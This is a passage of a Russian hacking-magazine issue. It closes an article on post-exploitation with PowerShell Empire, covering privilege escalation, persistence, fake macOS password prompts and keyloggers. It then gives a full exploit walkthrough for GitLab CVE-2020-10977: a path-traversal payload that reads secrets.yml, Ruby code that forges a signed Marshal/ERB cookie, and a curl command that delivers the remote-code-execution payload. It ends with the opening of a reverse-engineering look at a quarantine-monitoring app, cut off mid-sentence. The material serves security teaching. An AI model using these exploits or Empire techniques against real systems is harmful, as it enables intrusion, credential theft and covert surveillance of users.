ment/vnc. Запустим у себя VNC‐прос лушиватель (я использую Remmina)
и выполним обратное подключение.





                     Запуск VNC‐бэкконнекта





                       VNC‐клиент Remmina


Раз дел privesc
Раздел с повышением привилегий полезен толь ко для ограниченного круга
быстрых проверок, а также из‐за модуля privesc/getsystem, который поз‐
воляет перейти в контекст SYSTEM. В Empire встро ены два известных скрип‐
та: privesc/sherlock, который проверит наличие в атакуемой системе CVE‐
уязвимостей, и модуль privesc/powerup/allchecks — он поищет пути
повышения привилегий (к примеру, подменить файл службы).





                 Пример запус ка модуля allchecks





                 Пример запус ка модуля sherlock


Раз дел situational_awareness
Это очень полезный раз дел, с которого обычно и стоит начинать эксплу ата‐
цию. Отметим два важных модуля — situational_awareness/host/an‐
tivirusproduct и situational_awareness/host/applockerstatus. Пер‐
вый предоставляет информа цию об используемых на атакуемом хосте анти‐
вирусах, второй дает сведения об AppLocker.
   Благодаря модулю situational_awareness/host/computerdetails мы
можем посмотреть события 4648 (RDP) и 4624 (вхо ды в систему) из журнала
событий, а также журналы AppLocker, запуск PSScripts и сохраненные сеансы
RDP.





               Пример запус ка модуля computerdetails

Очень часто приходится сканировать SPN в сети, и в этом очень помогает
модуль  situational_awareness/network/get_spn.  Похожим  образом
модули   situational_awareness/network/powerview/get_domain_trust
и        situational_awareness/network/powerview/map_domain_trust
облегчают задачу поиска трастов, так как позволяют рекурсивно перечислять
все достижимые доверительные отно шения домена с текущей позиции
в сети. Но круче всего (по моему мнению) в этом раз деле модуль situation‐
al_awareness/network/bloodhound3.





                   Запуск BloodHound из Empire





           Загрузка результата BloodHound с удален ного хоста

С помощью этого средс тва мы загружаем полученные от BloodHound файлы
и можем их анализировать на своей локальной машине.


Раз дел persistence
Первым делом упомяну о некоторых методах персистентности, которые были
описаны здесь, а имен но:
 • SID History — реализован в модуле persistence/misc/add_sid_his
  tory;
 • SSP — реализован в модуле persistence/misc/memssp;
 • Skeleton Key — реализован  в модуле persistence/misc/skele
  ton_key.

Но перечисленные методы — это пользовательская персистентность. Она
нам понадобится, когда пользователь выключит или перезагрузит компьютер,
чтобы мы смогли вой ти и снова запустить сеанс Empire. Но чтобы избежать
подобного неудобства, в Empire есть и свои модули персистентности сеанса.
Мы используем один из двух модулей: persistence/elevated/registry
или persistence/elevated/wmi, раз ница только в том, что первый основан
на закреплении через реестр, а второй через WMI.





  Закрепляемся через реестр, используя модуль
  persistence/elevated/registry

Empire сообщает, что мы успешно закрепились. Для примера пос мотрим спи‐
сок агентов и перезагрузим систему. Пос ле вклю чения ПК у нас появился
новый агент!





          После перезаг рузки в списке появился новый агент

С Windows все, а теперь давай пос мотрим, что мы можем получить от Empire
при эксплуатации других систем.


ЭКСПЛУАТАЦИЯ И ПОСТЭКСПЛУАТАЦИЯ MACOS С EMPIRE
Базовые модули агента macOS схожи с базовы ми модулями агента Windows,
но есть отличие: вмес то PowerShell используется Python. Таким образом,
вместо модуля scriptimport присутству ет модуль pythonscript. Также
имеется модуль loadpymodule для заг рузки целых программ. Загружаемый
файл должен представлять собой ZIP‐архив, содержащий скрипты, написан‐
ные на  Python, или пакеты. Обязательно дол жен при сутствовать файл
__init__.py.
  Арсенал самих модулей для macOS куда скромнее, если сравнивать с Win‐
dows. Так, модуль collection/osx/browser_dump способен извлечь исто‐
рию запросов браузера, но не покажет куки и пароли. А модули для отсле‐
живания ввода пользователя вовсе работают ина че: кейлоггер collection/
osx/keylogger сохраняет историю на уда лен ной машине в файл, который
нам приходится скачивать, а для того, чтобы мониторить буфер обме на
с помощью модуля collection/osx/clipboard, нужно указать ему время
работы в секундах.





                Работа модуля collection/osx/keylogger

Но вот что работает безупречно — так это фишинг, а именно модуль collec‐
tion/osx/prompt.




            Использование модуля collection/osx/prompt

Среди прочего Empire позволяет запус тить App Store и попросить поль‐
зователя указать пароль, который мы незамедлительно получим.





                    Зап рос пароля пользователя




                 Использование модуля keylogger

Несмотря на то что я уже нас тра ивал кейлоггер, как только был вве ден
пароль, он отобразился в окне Empire. Как пра вило, схема экс плуатации Em‐
pire на Mac очень проста и успешно выполнима в 80% случаев:
 1. Фишинговое письмо с наг рузкой → получение Empire‐агента.
 2. Использование модуля collection/osx/prompt → получение пароля
   (как правило, sudo).
 3. Использование модуля privesc/multi/sudo_spawn  для  получения
   агента в контексте sudo.
 4. Закрепле ние в системе с использованием модуля persistence/osx/
  loginhook.

Сложилось мне ние, что на маках в основном обра баты вают информацию
и готовят отчеты. Поэтому единственное, для чего его стоит захватывать, —
это наблюдение за пользователем. Вся описанная выше атака занимает
по времени не больше 10–15 минут. Даже если пользователь не хочет вво‐
дить пароль, на третий‐четвертый раз он смирится и все равно его наберет.
  Имея учетные данные sudo, можно наблюдать за действиями пользовате‐
ля с помощью модуля management/osx/screen_sharing, который обеспечит
тебе VNC. В целом, повторюсь, захват макa — это лег ко и быстро, и, как пра‐
вило, основным инструментом атакующего служит фишинг.


ЭКСПЛУАТАЦИЯ И ПОСТЭКСПЛУАТАЦИЯ LINUX С EMPIRE
Работа с базовыми модулями Empire в Linux не отличается от работы на маке.
Точно так же, как и с маком, работает кейлоггер collection/linux/keylog‐
ger. Но в Linux‐версии присутствует хороший модуль privesc/linux/lin‐
ux_priv_checker, который собирает со всей системы информацию  (и
помогает искать вектор повышения привилегий). Среди собираемых данных
нужно перечислить сле дующие:
 • основная информация о системе;
 • работающие процессы;
 • интересные файлы;
 • файлы, доступные для записи;
 • логи, в которых встречается сло во password;
 • настройки судоера;
 • версия ПО и информация о нем из баз exploit‐db;
 • доступные на хосте средс тва раз работки.

Для перехода в контекст суперпользователя нам необходимо знать его
пароль. Для этого можно задейство вать тот же модуль, что и для макa, —
privesc/multi/sudo_spawn. В качестве параметра нужно задать листенер
и пароль sudo.


usemodule privesc/multi/sudo_spawn
set Password user
set Listener l1
run





  Использование sudo_spawn для соз дания нового агента в контексте sudo

В результате в списке агентов Empire появляется новый агент, работающий
от имени root.





                        Список агентов

После получения прав суперпользователя мы применя ем два модуля Empire.
Первый, collection/linux/mimipenguin, поз воляет собрать служебные
пароли из разных мест. Но он не идеален, поэтому для работы в этой области
обычно используются дру гие средс тва. Второй модуль — это persistence/
multi/crontab, помогающий закрепиться в системе за счет использования
crontab.





                   Парамет ры модуля crontab

Этому модулю требуется ука зать имя файла, который будет выполняться
в определенные промежут ки времени. Самый простой способ — загружать
тот же stager Empire.


ЗАКЛЮЧЕНИЕ
Напоследок стоит упомянуть, что для Empire сущес твуют и автоматические
сценарии, позволяющие собирать информа цию в системе или распростра‐
няться по сети. Один из них — DeathStar (авто матизирует частые сценарии
атак на Windows) — я уже упоминал в материале «Боковое переме щение
в Active Directory».


        WWW

                     Для тех, кто хочет получить больше информации
                      по   этой   теме,   я   создал   телеграм‐канал
                        @RalfHackerChannel. Здесь ты смо жешь задать
                       свои вопросы или ответить на вопросы других
                    юзеров.
ВЗЛОМ
  ЧИТАЙ
   И ВЫПОЛНЯЙ





                                                 aLLy
                                              ONsec
                                                    @iamsecurity



        КАК РАБОТАЕТ ЭКСПЛОИТ
    НОВОЙ УЯЗВИМОСТИ В GITLAB





В конце мар та 2020 года в популярном инструменте GitLab
был найден баг, который позволяет перейти от простого чте‐
ния файлов в сис теме к выполнению про извольных команд.
Уязвимости  присвоили  ста тус  критической,  поскольку
никаких особых прав в системе ата кующему не требуется.
В этой статье я покажу, как возникла эта брешь и как ее экс‐
плуатировать.


Автор эксплоита, который мы разберем, — исследователь и разработчик
из Австрии Уильям vakzz Боулинг (William Bowling). Он обнаружил, что класс
UploadsRewriter при определенных условиях никак не проверяет путь
до файла. Это открывает зло умышленнику возможность скопировать любой
файл в системе и использовать его в качес тве аттача при переносе issue
из одного проекта в другой.
  На этом исследователь не оста новился и нашел воз можность превратить
эту «читалку» в пол ноценную уязвимость типа RCE. Атакующий может про‐
читать файл secrets.yml, в котором находится токен для подписи cookie.
Специально сформированная и подписанная кука позволяет выполнять про‐
извольные команды на сервере.


             INFO

                       Уязвимость  относится  к  типу  path  traversal
                      и получила номер CVE‐2020‐10977. Уязвимы вер‐
                      сии GitLab EE/CE начиная с 8.5 и 12.9. Компания
                         GitLab в рамках программы bug bounty выплатила
                        за этот баг 20 тысяч долларов.



СТЕНД
Тестовое окружение для изу чения этого бага поднять очень прос то, так как у
GitLab есть официальный докер‐репозиторий. Можно одной командой запус‐
тить контейнер с любой версией приложения. Поэтому поднимем последнюю
уязвимую версию — 12.9.0.


docker run ‐‐rm ‐d ‐‐hostname gitlab.vh ‐p 443:443 ‐p 80:80 ‐p 2222:
22 ‐‐name gitlab gitlab/gitlab‐ce:12.9.0‐ce.0

Приставка CE означает Community Edition, можно взять и Enterprise (EE),
но тогда придется возиться с получением клю ча для пробного периода.
Для демонстрационных целей хва тит и CE, обе версии одинаково уязвимы.
  При первом посещении GitLab попросит уста новить пароль главного
админа. По дефол ту логин — admin@example.com.





          Задаем пароль админа пос ле первого запус ка GitLab

Дальше нам нужно создать два любых проекта.





            Создаем два репозитория на тес товом стенде

По факту стенд уже готов, и можно приступать к рассмотрению деталей.
Однако я еще скачаю исходники GitLab, чтобы наглядно продемонстри ровать,
в какие части кода закралась ошибка.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
  ЧИТАЙ И ВЫПОЛНЯЙ
                          КАК РАБОТАЕТ ЭКСПЛОИТ
                  НОВОЙ УЯЗВИМОСТИ В GITLAB





ЧТЕНИЕ ЛОКАЛЬНЫХ ФАЙЛОВ
Итак, сразу к делу — проблема находится в функции копирования issue.


             INFO

                   В русской версии интерфейса issue перевели
                         как «обсуждение», но мне кажет ся, что по смыслу
                      ближе термин «баг», «ошибка» или «проб лема»,
                       ведь именно их чаще всего и описывают в issue.
                   Я буду использовать то английское написа ние, то
                       различные вариации русского, так что не удив‐
                       ляйся.


Создадим в проекте Test новый issue.





                  Создание нового issue в GitLab

При создании можно описать детали проб лемы в формате Markdown, а еще
загрузить произвольный файл, например скриншот с ошибкой или лог‐файл,
чтобы упростить жизнь разработчикам.





         Прикрепле ние файла к описанию воз никшей проблемы

Все загруженные файлы складываются на диск в папку /var/opt/gitlab/
gitlab‐rails/uploads/. За это отвечает класс FileUploader.


doc/development/file_storage.md
31: | Description                           | In DB? | Relative path
(from CarrierWave.root)                       | Uploader class
         | model_type |
...
39: | Issues/MR/Notes Markdown attachments  | yes    | uploads/:
project_path_with_namespace/:random_hex/:filename  | `FileUploader`
         | Project    |

Сначала генерируется рандомная hex‐стро ка, которая будет именем папки.


app/uploaders/file_uploader.rb
011: class FileUploader < GitlabUploader
...
019:   VALID_SECRET_PATTERN = %r{\A\h{10,32}\z}.freeze
...
069:   def self.generate_secret
070:     SecureRandom.hex
071:   end
...
157:   def secret
158:     @secret ||= self.class.generate_secret
159:
160:     raise InvalidSecret unless @secret =~ VALID_SECRET_PATTERN
161:
162:     @secret
163:   end

А имя файла исполь зуется то, которое переда ли при загрузке.


app/uploaders/file_uploader.rb
212:   def secure_url
213:     File.join('/uploads', @secret, filename)
214:   end

После загрузки аттача ссылка в формате Markdown вставляется в описание
проблемы. Сохраним ее.
   GitLab позволяет перенести issue из одно го про екта в дру гой, что бывает
очень полезно, если ошиб ка касается и дру гого про дукта того же разработ‐
чика.





     Эта кнопка перемещает сообщения о проблемах между проектами

После нажатия на кнопку выбира ем проект, куда хотим отправить issue.





              Выбор проекта для перемещения issue

Во время перемещения issue в ста ром проекте закрывается и появляется
в новом.





                    Старый issue в новом проекте

Причем аттачи копируются, а не переносятся. То есть для них создаются
новые файлы и ссылки на них, соот ветс твенно.





        Прикрепленные файлы копируются при перемещении issue

Посмотрим в коде, как выполняется перенос. Все роуты, которые касаются
issues, можно найти в папке routes в файле issues.rb. Там в том числе есть
роут move, который отвечает за перенос. Именно он обрабаты вает поль‐
зовательский POST‐запрос с необ ходимыми параметрами.


config/routes/issues.rb
5: resources :issues, concerns: :awardable, constraints: { id: /\d+/
} do
6:   member do
...
9:     post :move

Затем мы попадаем в одноименную функцию.


app/controllers/projects/issues_controller.rb
123:   def move
124:     params.require(:move_to_project_id)
125:
126:     if params[:move_to_project_id].to_i > 0
127:       new_project = Project.find(params[:move_to_project_id])
128:       return render_404 unless issue.can_move?(current_user,
new_project)
129:
130:       @issue = Issues::UpdateService.new(project, current_user,
target_project: new_project).execute(issue)
131:     end

Здесь вызывается Issues::UpdateService.new,  в  качес тве  аргументов
передаются  ID  текущего проекта,  пользователь,  который ини циировал
перенос, и проект, куда нужно перенести issue. После этого управление
переходит к классу UpdateService. Он, в свою очередь, вызывает метод
move_issue_to_new_project.


app/services/issues/update_service.rb
03: module Issues
04:   class UpdateService < Issues::BaseService
05:     include SpamCheckMethods
06:
07:     def execute(issue)
08:       handle_move_between_ids(issue)
09:       filter_spam_check_params
10:       change_issue_duplicate(issue)
11:       move_issue_to_new_project(issue) || update_task_event(issue
) || update(issue)
12:     end


app/services/issues/update_service.rb
097:     def move_issue_to_new_project(issue)
098:       target_project = params.delete(:target_project)
099:
100:       return unless target_project &&
101:           issue.can_move?(current_user, target_project) &&
102:           target_project != issue.project
103:
104:       update(issue)
105:       Issues::MoveService.new(project, current_user).execute(
issue, target_project)
106:     end

Следующую часть уже выполняет класс Issues::MoveService — это нас‐
ледник Issuable::Clone::BaseService.


app/services/issues/move_service.rb
3: module Issues
4:   class MoveService < Issuable::Clone::BaseService

Здесь сначала вызывается метод execute из дочернего, а затем из родитель‐
ского класса.


app/services/issues/move_service.rb
03: module Issues
04:   class MoveService < Issuable::Clone::BaseService
05:     MoveError = Class.new(StandardError)
06:
07:     def execute(issue, target_project)
08:       @target_project = target_project
...
18:       super
19:
20:       notify_participants
21:
22:       new_entity
23:     end

В родителе нас интересует вызов метода update_new_entity.


app/services/issuable/clone/base_service.rb
03: module Issuable
04:   module Clone
05:     class BaseService < IssuableBaseService
06:       attr_reader :original_entity, :new_entity
07:
08:       alias_method :old_project, :project
09:
10:       def execute(original_entity, new_project = nil)
11:         @original_entity = original_entity
12:
13:         # Using transaction because of a high resources footprint
14:         # on rewriting notes (unfolding references)
15:         #
16:         ActiveRecord::Base.transaction do
17:           @new_entity = create_new_entity
18:
19:           update_new_entity
20:           update_old_entity
21:           create_notes
22:         end
23:       end

После создания нового issue в целевом проекте этот метод выполняет
перенос данных из оригинального issue.


app/services/issuable/clone/base_service.rb
27:       def update_new_entity
28:         rewriters = [ContentRewriter, AttributesRewriter]
29:
30:         rewriters.each do |rewriter|
31:           rewriter.new(current_user, original_entity, new_entity)
.execute
32:         end
33:       end

За копирование отвечает ContentRewriter.


app/services/issuable/clone/content_rewriter.rb
03: module Issuable
04:   module Clone
05:     class ContentRewriter < ::Issuable::Clone::BaseService
06:       def initialize(current_user, original_entity, new_entity)
07:         @current_user = current_user
08:         @original_entity = original_entity
09:         @new_entity = new_entity
10:         @project = original_entity.project
11:       end
...
13:       def execute
14:         rewrite_description
15:         rewrite_award_emoji(original_entity, new_entity)
16:         rewrite_notes
17:       end

На данном  этапе нам интересен  только метод rewrite_description,
который копирует содержимое описания ошиб ки.


app/services/issuable/clone/content_rewriter.rb
21:       def rewrite_description
22:         new_entity.update(description: rewrite_content(origin
al_entity.description))
23:       end

Наконец мы добрались до rewrite_content. Здесь и вызывается метод,
который дублирует аттачи ста рого issue в новый. Этим занимается Gitlab::
Gfm::UploadsRewriter.


54:       def rewrite_content(content)
55:         return unless content
56:
57:         rewriters = [Gitlab::Gfm::ReferenceRewriter, Gitlab::Gfm:
:UploadsRewriter]
58:
59:         rewriters.inject(content) do |text, klass|
60:           rewriter = klass.new(text, old_project, current_user)
61:           rewriter.rewrite(new_parent)
62:         end
63:       end

Он парсит содер жимое описания issue в поисках шаб лона с аттачем.


app/uploaders/file_uploader.rb
11: class FileUploader < GitlabUploader
...
17:   MARKDOWN_PATTERN = %r{\!?\[.*?\]\(/uploads/(?<secret>[0‐9a‐f]{
32})/(?<file>.*?)\)}.freeze


lib/gitlab/gfm/uploads_rewriter.rb
05: module Gitlab
06:   module Gfm
...
14:     class UploadsRewriter
15:       def initialize(text, source_project, _current_user)
16:         @text = text
17:         @source_project = source_project
18:         @pattern = FileUploader::MARKDOWN_PATTERN
19:       end
20:
21:       def rewrite(target_parent)
22:         return @text unless needs_rewrite?
23:
24:         @text.gsub(@pattern) do |markdown|

И если находит, то копирует этот файл.


25:           file = find_file(@source_project, $~[:secret], $~[:file
])
26:           break markdown unless file.try(:exists?)
27:
28:           klass = target_parent.is_a?(Namespace) ? Namesp
aceFileUploader : FileUploader
29:           moved = klass.copy_to(file, target_parent)


lib/gitlab/gfm/uploads_rewriter.rb
60:       def find_file(project, secret, file)
61:         uploader = FileUploader.new(project, secret: secret)
62:         uploader.retrieve_from_store!(file)
63:         uploader
64:       end


app/uploaders/file_uploader.rb
165:   # Return a new uploader with a file copy on another project
166:   def self.copy_to(uploader, to_project)
167:     moved = self.new(to_project)
168:     moved.object_store = uploader.object_store
169:     moved.filename = uploader.filename
170:
171:     moved.copy_file(uploader.file)
172:     moved
173:   end


app/uploaders/file_uploader.rb
175:   def copy_file(file)
176:     to_path = if file_storage?
177:                 File.join(self.class.root, store_path)
178:               else
179:                 store_path
180:               end
181:
182:     self.file = file.copy_to(to_path)
183:     record_upload # after_store is not triggered
184:   end

Как видишь, ни find_file, ни copy_to, ни copy_file никак не проверя ют
имя файла, а значит, любой файл в системе может легким движением руки
превратиться в аттач.
   Чтобы это проверить, воспользуемся методом выхода из директории
при помощи стандартно го ../. Нужно только определиться с количеством
ходов наверх. По дефолту полный путь до заг ружа емых файлов в контейнере
GitLab такой, как на скриншоте.





                     Путь к атта чам GitLab на диске

Полный путь до картинки из моего issue будет выглядеть следующим обра‐
зом:


/var/opt/gitlab/gitlab‐rails/uploads/@hashed/d4/73/d4735e3a265e16e
ee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35/ed4ae110d9f4021
350e5c1eaa123b6e1/mia.jpg

Длинный код в середине — это уникальный хеш текуще го проекта. Таким
образом, нам нужно минимум десять конс трукций ../, чтобы попасть в кор‐
невую директорию контейнера.
  Попробуем прочитать файл /etc/passwd. Редактируем описание issue
и добавляем необходимое количес тво ../ в пути к файлу. Я рекомендую ста‐
вить их побольше, чтобы точно попасть куда нужно.





             Path traversal в имени прикрепляемого к issue файла

Теперь сохраняем и переносим файл в другой проект.





   Успешная подмена прикрепленного фай ла через path traversal в GitLab

Появилась возможность скачать файл passwd, и если это сделать, то ты уви‐
дишь содержимое /etc/passwd.





           Чтение локальных файлов через path traversal в GitLab

Таким образом можно читать все, на что хватает прав у пользовате ля, от име‐
ни которого работает GitLab (в случае с Docker это git). И возникает другой
вопрос: а что же интересного можно прочитать?


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
  ЧИТАЙ И ВЫПОЛНЯЙ
                          КАК РАБОТАЕТ ЭКСПЛОИТ
                  НОВОЙ УЯЗВИМОСТИ В GITLAB





ОТ ЧИТАЛКИ К ВЫПОЛНЕНИЮ КОДА
Разумеется, в таком большом проекте, как GitLab, найдется множество инте‐
ресных файлов,  которые  атакующий может прочитать и  использовать
для компрометации системы. Тут и всевоз можные токены доступов, и данные
из приватных репозиториев, конфиги, наконец. Но есть один примечательный
файлик, данные из которого помогут выполнить любой код в системе. Вот
путь к нему:


/opt/gitlab/embedded/service/gitlab‐rails/config/secrets.yml

Здесь хранится важная переменная secret_key_base, при помощи которой
можно подписывать различные куки.





            Переменная secret_key_base в конфиге GitLab

Как и во многих современных решени ях, куки сериализуются и подписыва‐
ются, чтобы избежать подмены. На стороне сервера сигнатура сверяется
и только потом выполняется десериализация. По дефолту сериализатор
определен как :hybrid.


config/initializers/cookies_serializer.rb
4: Rails.application.config.action_dispatch.cookies_serializer = :
hybrid

Это позволяет нам использовать Marshal в качес тве фор мата и тем самым
вызывать различные объекты. Нас интересует шаб лонизатор Embedded Ruby
(ERB), который, помимо прочего, поз воляет выполнять консольные команды.
  Выражения в ERB описываются в конс трукциях вида <% [выражения] %>.
Внутри этого тега можно вызывать функции самого шаблонизатора, в том
числе код на Ruby. Что бы выполнить системную команду, можно вос поль‐
зоваться бэктиками или %x.


erb = ERB.new("<%= `uname ‐a` %>")

Для тестирования используем тес товый же докер‐контей нер и команду
для вызова консоли Rails — gitlab‐rails console.





    Тестирование выполнения кода через ERB‐шаб лоны в консоли Rails

Следующая конструкция нуж на для того, чтобы объявить метод result класса
ERB устаревшим.


ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb,
:result, "@result", ActiveSupport::Deprecation.new)

Это спровоцирует вызов result, и команда uname ‐a отработает.
  Возвращаемся  к  эксплу ата ции.  Сначала  нам  нужно  узнать  se‐
cret_key_base. Для это го читаем файл secrets.yml с помощью рас смот‐
ренного бага. Для это го соз даем issue со следующим содержимым:


[file](/uploads/000000000000000000000000
00000000/../../../../../../../../../../../../../opt/gitlab/embedded/
service/gitlab‐rails/config/secrets.yml)

Как видишь, необязательно, что бы существо вала папка uploads, главное,
чтобы вся конструкция попада ла под регулярное выражение MARKDOWN_PAT‐
TERN.


app/uploaders/file_uploader.rb
11: class FileUploader < GitlabUploader
...
17:   MARKDOWN_PATTERN = %r{\!?\[.*?\]\(/uploads/(?<secret>[0‐9a‐f]{
32})/(?<file>.*?)\)}.freeze

То есть подойдет любая строка в 32 символа, состоящая из символов
от 0 до 9 и от a до f. Теперь сохраняем и переносим issue в другой проект.
В результате получаем прикрепленный файл secrets.yml.
  Для  следующего  шага  поднимем  свой  GitLab  и  в  качестве  se‐
cret_key_base укажем добытую переменную. Это нужно, чтобы при помощи
GitLab сгенерировать куку с пейлоадом и валидной подписью, которая прой‐
дет проверку на атакуемой машине. Так как у нас тес товый стенд, просто про‐
вернем все манипуляции на нем. Снова запускаем консоль (gitlab‐rails
console).
  Создаем новый запрос, в качес тве конфига указываем переменные окру‐
жения GitLab.


request = ActionDispatch::Request.new(Rails.application.env_config)

Дальше при помощи переменной окружения action_dispatch.cookies_se‐
rializer указываем сериализатор кук Marshal.


request.env["action_dispatch.cookies_serializer"] = :marshal

Затем создаем куки.


cookies = request.cookie_jar

Теперь дело за шаблоном‐пейлоадом. Резуль таты выполнения команды
получить не удастся, поэто му подстраиваем вектор под эти условия.


erb = ERB.new("<%= `echo Hello > /tmp/owned` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.
new(erb, :result, "@result", ActiveSupport::Deprecation.new)

Передаем полученный объект в качес тве куки.


cookies.signed[:cookie] = depr

Выводим получившуюся строку.


puts cookies[:cookie]





          Создание пейлоада для экс плуатации RCE в GitLab

Теперь нужно передать пейлоад в печеньке, которая предус матривает сери‐
ализацию. Исследователь предлага ет использовать experimentation_sub‐
ject_id.


lib/gitlab/experimentation.rb
11: module Gitlab
12:   module Experimentation
...
39:     module ControllerConcern
40:       extend ActiveSupport::Concern
41:
42:       included do
43:         before_action :set_experimentation_subject_id_cookie,
unless: :dnt_enabled?
...
47:       def set_experimentation_subject_id_cookie
48:         return if cookies[:experimentation_subject_id].present?
...
85:       def experimentation_subject_id
86:         cookies.signed[:experimentation_subject_id]
87:       end

Я предлагаю взять стандартную куку, которая исполь зуется для автоматичес‐
кой авторизации пользователя, ког да при логине ты ставишь галочку Remem‐
ber me.





                   Ку ка remember_user_token в GitLab

Отправляем на сервер полученный пейлоад.


curl 'http://gitlab.vh/' ‐b "remember_user_token=BAhvOkBBY3RpdmV
TdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibG
VQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiW
SNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBlY2hv
IEhlbGxvID4gL3RtcC9vd25lZGAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5
jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6Dk
BmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQ
HJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJl
Y2F0aW9uAAY7ClQ=‐‐cbab57f416c45e3048a8e557f4e988f245859c03"

Команда была выпол нена, и файл /tmp/owned успешно создан.





                Удаленное выполнение команд в GitLab


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ЗАКЛЮЧЕНИЕ
Эта уязвимость проста в экс плуатации и при этом крайне опасна. Так как Git‐
Lab — очень распростра ненный инс тру мент, то под угрозой оказываются
тысячи критических для всей инфраструктуры сервисов. Что может быть опас‐
ней, чем атакующий, получивший дос туп к исходникам твоих проектов?
   Баг существует в коде уже четыре с лишним года и успешно кочу ет
из одной ветки в другую начиная с GitLab версии 8.5, дата релиза которой,
на минуточку, конец февраля 2016  года. Поэто му  как можно  скорее
обновляйся на версию 12.9.1, где уязвимость была исправлена.
ПРИВАТНОСТЬ
МОНИТОРИМ
МОНИТОРИНГ

ЧТО ВНУТРИ
У ПРИЛОЖЕНИЯ
ДЛЯ ИЗОЛЯЦИИ
НА ДОМУ





        Mazay
    stariy2003@yandex.ru





Приложение «Социальный монито ринг», которое поз воляет
следить за тем, чтобы заразившиеся коронавирусом оста‐
вались дома, уже успело собрать массу негативных отзывов.
Оно, мол, и глюкавое, и вообще «цифровой ошей ник». Одна‐
ко именно технической информации о нем (и, в частности,
о его последней версии) немного. Чтобы восполнить этот
пробел, я предпринял собственное иссле дование.


Итак, последняя версия приложения — 1.4.1. Раз работчик при ложения —
Департамент информационных технологий города Москвы. Сущес твуют вер‐
сии для Android и iOS. По данным из Google Play, на текущий момент при‐
ложение установлено более чем у 50 тысяч поль зователей. Обе щано, что
если ваш телефон не поддерживает его, то в теории вам дол жен быть пре‐
доставлен аппарат с уже уста новленным приложением. На практике, конечно,
такое случается далеко не всегда и не сразу.
  На сайте мэра Москвы заявлено, что «при ложение при авторизации про‐
сит подтвердить номер телефона и сделать фотографию лица, а в даль‐
нейшем фиксирует геоло кацию и зап рашивает фотографию пос редс твом
пуш‐уведомления». С виду это действи тельно так, а если проигнорировать
запрос на фото или выйти за пределы квартиры, будет автоматически
выписан штраф. Если отказать ся от уста новки, то принудительно поместят
в обсерватор или больницу. Если удалить приложение после установки
и регистрации, то будут присылать штрафы.
  Конечно, ставить что‐либо на свой телефон по чьему‐то требованию мне
не хотелось, но раз уж я был к этому принуж ден весь ма незамыс ловатым спо‐
собом, то надо хотя бы проверить, действительно ли приложение выполняет
только заявленные функции, или там есть что‐то еще.
   Итак, поехали. Сразу скажу — я не гуру реверса, так что мог чего‐то
не заметить. Если обнаружишь что‐то новое, обя зательно поделись наход кой
в комментариях.


СМОТРИМ ТРАФИК
Первым делом я решил про верить тра фик с помощью приложения Fiddler,
однако тут меня ждало разочарование. «Соци аль ный мониторинг» устанав‐
ливает шифрованное соединение (HTTPS) с сервером mos.ru, а что там про‐
исходит дальше — так просто не понять, нужно или рутовать телефон,
или пересобирать приложение. Но на рутованном аппарате при ложе ние
не работает, а пересобирать его я не рискнул, слишком высока цена ошиб‐
ки — 4000 рублей за каждый пропущен ный зап рос на фотографию. А вдруг
этот запрос придет как раз в тот момент, когда я буду с трафиком разбирать‐
ся...
  С помощью Fiddler и logcat удалось выяс нить только то, что при ложение
раз в пять минут что‐то отправляет на mos.ru. Что ж, придется декомпилиро‐
вать и ковыряться в коде.


ДЕКОМПИЛИРУЕМ ПРИЛОЖЕНИЕ
Для декомпиляции я использовал прог рамму JEB версии 3.17.1 производс‐
тва PNF Software. На мой взгляд, это одно из лучших приложений для иссле‐
дования APK, единственный его недос таток — высокая стоимость.
  Приложение  подписано  сертифика том,  сгенерированным  17  апре‐
ля 2020 года, и почему‐то ука зан город Самара. Интерес но, при чем тут
Самара?





Первым делом смотрим, что в манифесте.





Версия программы — 1.4.1, имя пакета — ru.mos.socmon.
  Приложение запрашива ет следующие раз решения: доступ к координатам,
в том числе и фоновый, доступ к камере, к интернету, состоянию сети, сос‐
тоянию и изменению Wi‐Fi, воз можность запускать неубиваемые сервисы
и добавление в список исклю чений оптимиза ции батареи (чтобы ОС не зас‐
тавляла приложение экономить энергию), а также чтение и запись данных
на карте памяти. Ну что же, уже неплохо — намеков на недекларированные
функции пока не видно. Контакты, журнал звонков, SMS и прочее вроде
не просят. Будем смотреть дальше.
   Дальше  видим,  что  приложение  весьма  обфусци ровано.  Конечно,
это осложняет анализ, но попробуем.
  Обычно при анализе всякой обфусцированной вирусни я пос тупаю так:
сначала пере именовываю все объявленные переменные в соответствии с их
типом, то есть вместо a, b, c, d пишу intIn, intOut, int1, str1 и так далее.
Затем заново смотрю на код, уже ста новится видно, что некоторые перемен‐
ные можно переименовать в counter, i, k, resString. Ну и третьим про‐
ходом после беглого анализа алгоритма переименовы ваю во всякие там
name, password, hashMD5 и так далее.
   То же самое и с клас сами. Сна чала переименовы ваю созвучно тому,
от чего класс наследуется, нап ример activity1 или serviceHZ, а дальше
уже, изучив содержимое, даю осмыслен ное имя. Да, это кропотливый труд,
но я не знаю, как по‐другому эффективно бороться с обфускацией. В данном
случае объем кода не поз воляет выполнить такие переименования за разум‐
ное время, да и нет в этом особой необходимости.
  Прежде чем погружаться в деб ри кода, окинем взглядом используемые
приложением нативные библиотеки, а именно:
 • libconscrypt_jni.so —   гуг ловская  биб лиотека  Conscrypt,  поставщик
   безопасности Java (JSP), который реализует рас ширения криптографии
   Java (JCE) и расширения безопас ных сокетов Java (JSSE). Он использует
   BoringSSL для предоставления крип тогра фичес ких примитивов и безопас‐
